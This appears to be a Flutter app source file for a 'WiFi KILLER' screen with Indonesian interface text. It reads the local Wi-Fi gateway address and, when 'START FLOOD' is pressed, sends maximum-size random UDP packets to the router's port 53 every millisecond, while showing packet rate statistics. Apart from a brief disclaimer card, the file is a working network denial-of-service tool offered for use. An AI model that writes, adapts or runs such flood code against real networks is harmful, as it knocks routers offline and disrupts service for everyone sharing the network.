// lib/features/tools/network/wifi_internal.dart
import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';
import '../../dashboard/xtheme.dart';

// ─── XTHEME-DRIVEN COLORS ────────────────────────────────────────────
Color wkBgMain = const Color(0xFF160A07);
Color wkBgSurface = const Color(0xFF2A140E);
Color wkBgCard = const Color(0xFF3A1E15);
Color wkTextMain = const Color(0xFFF3E6DD);
Color wkTextSub = const Color(0xFFC9913F);
Color wkGold = const Color(0xFFD4A853);
Color wkRed = const Color(0xFFB71C1C);
Color wkRedDark = const Color(0xFF7F0000);
Color wkRedDeep = const Color(0xFF4A0000);
Color wkGreen = const Color(0xFF4CAF50);
Color wkBlue = const Color(0xFF2196F3);
Color wkYellow = const Color(0xFFFFC107);
Color wkBorderDark = const Color(0xFF1A0505);

void applyXTheme(XThemeData theme) {
  wkBgMain     = theme.brownDark;
  wkBgSurface  = Color.lerp(theme.brownMid, theme.brownDark, 0.55)!;
  wkBgCard     = theme.brownMid;
  wkTextMain   = theme.bgCreamLight;
  wkTextSub    = theme.gold;
  wkGold       = theme.gold;
  wkRed        = theme.redMain;
  wkRedDark    = theme.redDark;
  wkRedDeep    = theme.redDeep;
  wkGreen      = theme.accentGreen;
  wkBlue       = theme.accentBlue;
  wkYellow     = theme.accentYellow;
  wkBorderDark = theme.borderDark;
}

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  bool _isLoadingInfo = true;
  int _packetCount = 0;
  int _packetPerSecond = 0;
  int _peakPps = 0;
  Duration _elapsed = Duration.zero;
  int _startTime = 0;

  Timer? _loopTimer;
  Timer? _statsTimer;
  Timer? _elapsedTimer;

  final XThemeController _themeController = XThemeController();

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  @override
  void dispose() {
    _loopTimer?.cancel();
    _statsTimer?.cancel();
    _elapsedTimer?.cancel();
    super.dispose();
  }

  // ═══════════════════════════════════════════════════════════════════
  // LOAD WIFI INFO
  // ═══════════════════════════════════════════════════════════════════
  Future<void> _loadWifiInfo() async {
    setState(() => _isLoadingInfo = true);

    final info = NetworkInfo();

    try {
      // Cek permission
      final status = await Permission.locationWhenInUse.request();
      if (!status.isGranted) {
        _showSnack("❌ Akses lokasi diperlukan untuk membaca info WiFi",
            isError: true);
        setState(() => _isLoadingInfo = false);
        return;
      }

      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      if (!mounted) return;
      setState(() {
        ssid = (name ?? "-").replaceAll('"', '');
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
        _isLoadingInfo = false;
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
        _isLoadingInfo = false;
      });
    }
  }

  // ═══════════════════════════════════════════════════════════════════
  // START FLOOD
  // ═══════════════════════════════════════════════════════════════════
  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error" || routerIp.isEmpty) {
      _showSnack("❌ Router IP tidak tersedia", isError: true);
      return;
    }

    setState(() {
      isKilling = true;
      _packetCount = 0;
      _packetPerSecond = 0;
      _peakPps = 0;
      _elapsed = Duration.zero;
      _startTime = DateTime.now().millisecondsSinceEpoch;
    });

    HapticFeedback.heavyImpact();

    const targetPort = 53;
    final List<int> payload =
        List<int>.generate(65495, (_) => Random().nextInt(256));

    // Flood loop
    _loopTimer = Timer.periodic(const Duration(milliseconds: 1), (_) async {
      if (!isKilling) return;
      try {
        for (int i = 0; i < 2; i++) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();

          if (mounted) {
            setState(() {
              _packetCount += 9;
              _packetPerSecond += 9;
              if (_packetPerSecond > _peakPps) _peakPps = _packetPerSecond;
            });
          }
        }
      } catch (_) {}
    });

    // Reset PPS setiap detik
    _statsTimer = Timer.periodic(const Duration(seconds: 1), (_) {
      if (!isKilling) return;
      if (mounted) setState(() => _packetPerSecond = 0);
    });

    // Elapsed timer
    _elapsedTimer = Timer.periodic(const Duration(seconds: 1), (_) {
      if (!isKilling) return;
      if (mounted) {
        setState(() {
          _elapsed = Duration(
            milliseconds:
                DateTime.now().millisecondsSinceEpoch - _startTime,
          );
        });
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════
  // STOP FLOOD
  // ═══════════════════════════════════════════════════════════════════
  void _stopFlood() {
    if (!isKilling) return;
    setState(() => isKilling = false);
    HapticFeedback.lightImpact();
    _loopTimer?.cancel();
    _statsTimer?.cancel();
    _elapsedTimer?.cancel();
    _loopTimer = null;
    _statsTimer = null;
    _elapsedTimer = null;
  }

  void _showSnack(String msg, {bool isError = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(
          msg,
          style: TextStyle(
            color: wkTextMain,
            fontWeight: FontWeight.w700,
            fontFamily: 'ShareTechMono',
          ),
        ),
        backgroundColor: isError ? wkRed : wkGreen,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: BorderSide(color: wkBorderDark, width: 2),
        ),
      ),
    );
  }

  String _formatNumber(int n) {
    if (n < 1000) return '$n';
    if (n < 1000000) return '${(n / 1000).toStringAsFixed(1)}K';
    return '${(n / 1000000).toStringAsFixed(2)}M';
  }

  String _formatDuration(Duration d) {
    final m = d.inMinutes.toString().padLeft(2, '0');
    final s = (d.inSeconds % 60).toString().padLeft(2, '0');
    return '$m:$s';
  }

  // ═══════════════════════════════════════════════════════════════════
  // 3D HELPERS
  // ═══════════════════════════════════════════════════════════════════
  BoxDecoration _bevelDecoration({
    double radius = 18,
    Color? glow,
    double glowOpacity = 0.25,
  }) {
    return BoxDecoration(
      borderRadius: BorderRadius.circular(radius),
      gradient: LinearGradient(
        begin: Alignment.topLeft,
        end: Alignment.bottomRight,
        colors: [
          wkTextMain.withOpacity(0.20),
          wkRed.withOpacity(0.15),
          Colors.black.withOpacity(0.55),
        ],
        stops: const [0.0, 0.5, 1.0],
      ),
      boxShadow: [
        BoxShadow(
          color: Colors.black.withOpacity(0.75),
          blurRadius: 22,
          spreadRadius: -6,
          offset: const Offset(0, 12),
        ),
        BoxShadow(
          color: Colors.black.withOpacity(0.5),
          blurRadius: 8,
          offset: const Offset(0, 4),
        ),
        BoxShadow(
          color: (glow ?? wkGold).withOpacity(glowOpacity),
          blurRadius: 26,
          spreadRadius: -8,
          offset: const Offset(0, 6),
        ),
      ],
    );
  }

  Widget _bevelBox({
    required Widget child,
    double radius = 18,
    Color? glow,
    double glowOpacity = 0.25,
  }) {
    return Container(
      decoration: _bevelDecoration(
          radius: radius, glow: glow, glowOpacity: glowOpacity),
      padding: const EdgeInsets.all(1.6),
      child: Container(
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(radius - 1),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [wkBgCard, wkBgMain],
          ),
        ),
        child: child,
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  // BUILD
  // ═══════════════════════════════════════════════════════════════════
  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _themeController,
      builder: (context, _) {
        applyXTheme(_themeController.currentTheme);

        return Scaffold(
          backgroundColor: wkBgMain,
          body: Container(
            decoration: BoxDecoration(
              gradient: RadialGradient(
                center: const Alignment(-0.5, -0.8),
                radius: 1.4,
                colors: [
                  Color.lerp(wkBgMain, wkRed, 0.25)!,
                  wkBgMain,
                  Colors.black,
                ],
                stops: const [0.0, 0.5, 1.0],
              ),
            ),
            child: SafeArea(
              child: Column(
                children: [
                  _buildAppBar(),
                  Expanded(
                    child: SingleChildScrollView(
                      physics: const BouncingScrollPhysics(),
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        children: [
                          _buildHeroCard(),
                          const SizedBox(height: 14),
                          _buildInfoCard(),
                          const SizedBox(height: 14),
                          if (isKilling) ...[
                            _buildStatsCard(),
                            const SizedBox(height: 14),
                          ],
                          _buildAttackButton(),
                          const SizedBox(height: 14),
                          _buildWarningCard(),
                          const SizedBox(height: 24),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        );
      },
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  // APP BAR 3D
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildAppBar() {
    return Container(
      padding: const EdgeInsets.fromLTRB(8, 12, 16, 12),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [wkBgSurface, wkBgMain],
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
        ),
        border: Border(
          bottom: BorderSide(color: wkGold.withOpacity(0.4), width: 2),
        ),
        boxShadow: [
          const BoxShadow(
            color: Color(0xCC000000),
            blurRadius: 0,
            offset: Offset(0, 4),
          ),
          BoxShadow(color: wkGold.withOpacity(0.25), blurRadius: 18),
        ],
      ),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [wkRed, wkRedDark],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: wkBorderDark, width: 2.5),
                boxShadow: const [
                  BoxShadow(
                    color: Color(0xCC000000),
                    blurRadius: 0,
                    offset: Offset(3, 3),
                  ),
                ],
              ),
              child: const Icon(Icons.arrow_back_ios_new,
                  color: Colors.white, size: 16),
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Container(
              padding:
                  const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [wkRed, wkRedDark],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: wkBorderDark, width: 2.5),
                boxShadow: [
                  const BoxShadow(
                    color: Color(0xCC000000),
                    blurRadius: 0,
                    offset: Offset(3, 3),
                  ),
                  BoxShadow(color: wkGold.withOpacity(0.5), blurRadius: 12),
                ],
              ),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(Icons.wifi_off_rounded, color: wkGold, size: 16),
                  const SizedBox(width: 8),
                  Flexible(
                    child: Text(
                      'WiFi KILLER',
                      style: const TextStyle(
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.w900,
                        fontSize: 12,
                        letterSpacing: 1.5,
                        color: Colors.white,
                        shadows: [
                          Shadow(
                            color: Color(0xCC000000),
                            blurRadius: 3,
                            offset: Offset(1, 1),
                          ),
                        ],
                      ),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                ],
              ),
            ),
          ),
          const SizedBox(width: 8),
          // Refresh button
          GestureDetector(
            onTap: _isLoadingInfo ? null : _loadWifiInfo,
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [wkGold, Color.lerp(wkGold, Colors.black, 0.4)!],
                ),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: wkBorderDark, width: 2),
                boxShadow: const [
                  BoxShadow(
                    color: Color(0xCC000000),
                    blurRadius: 0,
                    offset: Offset(2, 2),
                  ),
                ],
              ),
              child: _isLoadingInfo
                  ? SizedBox(
                      width: 18,
                      height: 18,
                      child: CircularProgressIndicator(
                        strokeWidth: 2,
                        color: wkRedDark,
                      ),
                    )
                  : Icon(Icons.refresh_rounded,
                      color: wkRedDark, size: 18),
            ),
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  // HERO CARD 3D
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildHeroCard() {
    return _bevelBox(
      radius: 20,
      glow: isKilling ? wkRed : wkGold,
      glowOpacity: isKilling ? 0.55 : 0.35,
      child: Padding(
        padding: const EdgeInsets.all(18),
        child: Row(
          children: [
            AnimatedContainer(
              duration: const Duration(milliseconds: 300),
              padding: const EdgeInsets.all(14),
              decoration: BoxDecoration(
                gradient: isKilling
                    ? LinearGradient(
                        colors: [wkRed, Color.lerp(wkRed, Colors.black, 0.5)!],
                      )
                    : LinearGradient(
                        colors: [
                          wkGold,
                          Color.lerp(wkGold, Colors.black, 0.5)!
                        ],
                      ),
                shape: BoxShape.circle,
                border: Border.all(color: wkBorderDark, width: 2.5),
                boxShadow: [
                  BoxShadow(
                    color: (isKilling ? wkRed : wkGold).withOpacity(0.65),
                    blurRadius: 18,
                    spreadRadius: 1,
                  ),
                  const BoxShadow(
                    color: Color(0xCC000000),
                    blurRadius: 0,
                    offset: Offset(3, 3),
                  ),
                ],
              ),
              child: Icon(
                isKilling ? Icons.wifi_off_rounded : Icons.wifi_rounded,
                size: 28,
                color: Colors.white,
                shadows: const [
                  Shadow(
                    color: Color(0xCC000000),
                    blurRadius: 3,
                    offset: Offset(1, 1),
                  ),
                ],
              ),
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    isKilling ? '🔥 FLOODING...' : '⚡ READY',
                    style: TextStyle(
                      color: isKilling ? wkYellow : wkTextMain,
                      fontSize: 18,
                      fontWeight: FontWeight.w900,
                      fontFamily: 'Orbitron',
                      letterSpacing: 1.2,
                      shadows: [
                        Shadow(
                          color:
                              (isKilling ? wkRed : wkGold).withOpacity(0.7),
                          blurRadius: 12,
                        ),
                        const Shadow(
                          color: Color(0xCC000000),
                          blurRadius: 4,
                          offset: Offset(1, 1),
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    isKilling
                        ? 'Mengirim paket ke $routerIp'
                        : 'Analisis jaringan WiFi',
                    style: TextStyle(
                      color: wkTextSub,
                      fontSize: 12,
                      fontFamily: 'ShareTechMono',
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                  if (isKilling) ...[
                    const SizedBox(height: 6),
                    Row(
                      children: [
                        Icon(Icons.timer_rounded, color: wkGold, size: 12),
                        const SizedBox(width: 4),
                        Text(
                          _formatDuration(_elapsed),
                          style: TextStyle(
                            color: wkGold,
                            fontSize: 12,
                            fontWeight: FontWeight.w900,
                            fontFamily: 'Orbitron',
                          ),
                        ),
                      ],
                    ),
                  ],
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  // INFO CARD 3D
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildInfoCard() {
    return _bevelBox(
      radius: 20,
      glow: wkGold,
      glowOpacity: 0.3,
      child: Padding(
        padding: const EdgeInsets.all(18),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            _buildSectionLabel('NETWORK INFO', Icons.router_rounded),
            const SizedBox(height: 14),
            _buildInfoRow('SSID', ssid, Icons.wifi_rounded),
            _buildInfoRow('IP Address', ip, Icons.devices_rounded),
            _buildInfoRow('Frequency', '$frequency MHz', Icons.settings_input_antenna_rounded),
            _buildInfoRow('Router IP', routerIp, Icons.router_rounded, highlight: true),
          ],
        ),
      ),
    );
  }

  Widget _buildSectionLabel(String text, IconData icon) {
    return Row(
      children: [
        Container(
          padding: const EdgeInsets.all(7),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [wkGold, Color.lerp(wkGold, Colors.black, 0.4)!],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
            shape: BoxShape.circle,
            border: Border.all(color: wkBorderDark, width: 2),
            boxShadow: const [
              BoxShadow(
                color: Color(0xAA000000),
                blurRadius: 0,
                offset: Offset(2, 2),
              ),
            ],
          ),
          child: Icon(icon, color: wkRedDark, size: 14),
        ),
        const SizedBox(width: 10),
        Text(
          text,
          style: TextStyle(
            color: wkTextMain,
            fontSize: 12,
            fontWeight: FontWeight.w900,
            fontFamily: 'Orbitron',
            letterSpacing: 1.5,
            shadows: const [
              Shadow(
                color: Color(0xCC000000),
                blurRadius: 3,
                offset: Offset(1, 1),
              ),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildInfoRow(String label, String value, IconData icon,
      {bool highlight = false}) {
    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: highlight
              ? [
                  wkGold.withOpacity(0.2),
                  wkGold.withOpacity(0.05),
                ]
              : [wkBgSurface, wkBgMain],
        ),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(
          color: highlight
              ? wkGold.withOpacity(0.6)
              : wkGold.withOpacity(0.25),
          width: highlight ? 2 : 1.5,
        ),
        boxShadow: highlight
            ? [
                const BoxShadow(
                  color: Color(0xAA000000),
                  blurRadius: 0,
                  offset: Offset(2, 2),
                ),
                BoxShadow(
                  color: wkGold.withOpacity(0.3),
                  blurRadius: 10,
                ),
              ]
            : const [
                BoxShadow(
                  color: Color(0xAA000000),
                  blurRadius: 0,
                  offset: Offset(2, 2),
                ),
              ],
      ),
      child: Row(
        children: [
          Icon(icon, color: wkGold, size: 14),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  label,
                  style: TextStyle(
                    color: wkTextSub,
                    fontSize: 9,
                    fontWeight: FontWeight.w700,
                    fontFamily: 'Orbitron',
                    letterSpacing: 1,
                  ),
                ),
                const SizedBox(height: 2),
                Text(
                  value,
                  style: TextStyle(
                    color: highlight ? wkGold : wkTextMain,
                    fontSize: 13,
                    fontWeight: FontWeight.w900,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  // STATS CARD 3D
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildStatsCard() {
    return Row(
      children: [
        Expanded(
          child: _buildStatCard(
            icon: Icons.inventory_2_rounded,
            label: 'PACKETS',
            value: _formatNumber(_packetCount),
            color: wkBlue,
          ),
        ),
        const SizedBox(width: 10),
        Expanded(
          child: _buildStatCard(
            icon: Icons.bolt_rounded,
            label: 'PPS',
            value: '$_packetPerSecond',
            color: wkGreen,
          ),
        ),
        const SizedBox(width: 10),
        Expanded(
          child: _buildStatCard(
            icon: Icons.trending_up_rounded,
            label: 'PEAK',
            value: _formatNumber(_peakPps),
            color: wkYellow,
          ),
        ),
      ],
    );
  }

  Widget _buildStatCard({
    required IconData icon,
    required String label,
    required String value,
    required Color color,
  }) {
    return _bevelBox(
      radius: 14,
      glow: color,
      glowOpacity: 0.3,
      child: Padding(
        padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 8),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(6),
              decoration: BoxDecoration(
                color: color.withOpacity(0.15),
                shape: BoxShape.circle,
                border: Border.all(color: color.withOpacity(0.4), width: 1.5),
              ),
              child: Icon(icon, color: color, size: 14),
            ),
            const SizedBox(height: 8),
            Text(
              value,
              style: TextStyle(
                color: color,
                fontSize: 16,
                fontWeight: FontWeight.w900,
                fontFamily: 'Orbitron',
                letterSpacing: 0.5,
                shadows: [
                  Shadow(
                    color: color.withOpacity(0.6),
                    blurRadius: 10,
                  ),
                  const Shadow(
                    color: Color(0xCC000000),
                    blurRadius: 3,
                    offset: Offset(1, 1),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 2),
            Text(
              label,
              style: TextStyle(
                color: wkTextSub,
                fontSize: 9,
                fontWeight: FontWeight.w700,
                fontFamily: 'Orbitron',
                letterSpacing: 1,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  // ATTACK BUTTON 3D
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildAttackButton() {
    final isReady = !_isLoadingInfo &&
        routerIp != "-" &&
        routerIp != "Error" &&
        routerIp.isNotEmpty;

    final activeColor = isKilling ? wkRed : wkGold;

    return GestureDetector(
      onTap: isKilling ? _stopFlood : (isReady ? _startFlood : null),
      child: Container(
        height: 68,
        decoration: BoxDecoration(
          gradient: isReady || isKilling
              ? LinearGradient(
                  colors: [
                    activeColor,
                    Color.lerp(activeColor, Colors.black, 0.5)!,
                  ],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                )
              : LinearGradient(
                  colors: [
                    wkTextSub.withOpacity(0.3),
                    wkTextSub.withOpacity(0.1),
                  ],
                ),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: isReady || isKilling
                ? wkBorderDark
                : wkTextSub.withOpacity(0.3),
            width: 3,
          ),
          boxShadow: isReady || isKilling
              ? [
                  const BoxShadow(
                    color: Color(0xCC000000),
                    blurRadius: 0,
                    offset: Offset(5, 5),
                  ),
                  BoxShadow(
                    color: activeColor.withOpacity(0.6),
                    blurRadius: 22,
                    spreadRadius: -4,
                  ),
                ]
              : null,
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(
              isKilling ? Icons.stop_rounded : Icons.wifi_off_rounded,
              color: isReady || isKilling
                  ? Colors.white
                  : wkTextSub.withOpacity(0.5),
              size: 26,
              shadows: const [
                Shadow(
                  color: Color(0xCC000000),
                  blurRadius: 4,
                  offset: Offset(1, 1),
                ),
              ],
            ),
            const SizedBox(width: 12),
            Text(
              isKilling ? 'STOP FLOOD' : 'START FLOOD',
              style: TextStyle(
                fontSize: 15,
                letterSpacing: 2,
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.w900,
                color: isReady || isKilling
                    ? Colors.white
                    : wkTextSub.withOpacity(0.5),
                shadows: isReady || isKilling
                    ? const [
                        Shadow(
                          color: Color(0xCC000000),
                          blurRadius: 4,
                          offset: Offset(1, 1),
                        ),
                      ]
                    : null,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  // WARNING CARD 3D
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildWarningCard() {
    return _bevelBox(
      radius: 16,
      glow: wkRed,
      glowOpacity: 0.35,
      child: Padding(
        padding: const EdgeInsets.all(14),
        child: Row(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [wkRed, Color.lerp(wkRed, Colors.black, 0.5)!],
                ),
                shape: BoxShape.circle,
                border: Border.all(color: wkBorderDark, width: 1.5),
                boxShadow: [
                  BoxShadow(
                    color: wkRed.withOpacity(0.5),
                    blurRadius: 8,
                  ),
                ],
              ),
              child: const Icon(Icons.warning_amber_rounded,
                  color: Colors.white, size: 16),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'PERINGATAN',
                    style: TextStyle(
                      color: wkRed,
                      fontSize: 11,
                      fontWeight: FontWeight.w900,
                      fontFamily: 'Orbitron',
                      letterSpacing: 1.2,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    'Fitur ini hanya untuk testing pribadi. Menyerang jaringan tanpa izin adalah ilegal. Gunakan dengan tanggung jawab.',
                    style: TextStyle(
                      color: wkTextSub,
                      fontSize: 11,
                      height: 1.5,
                      fontFamily: 'ShareTechMono',
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}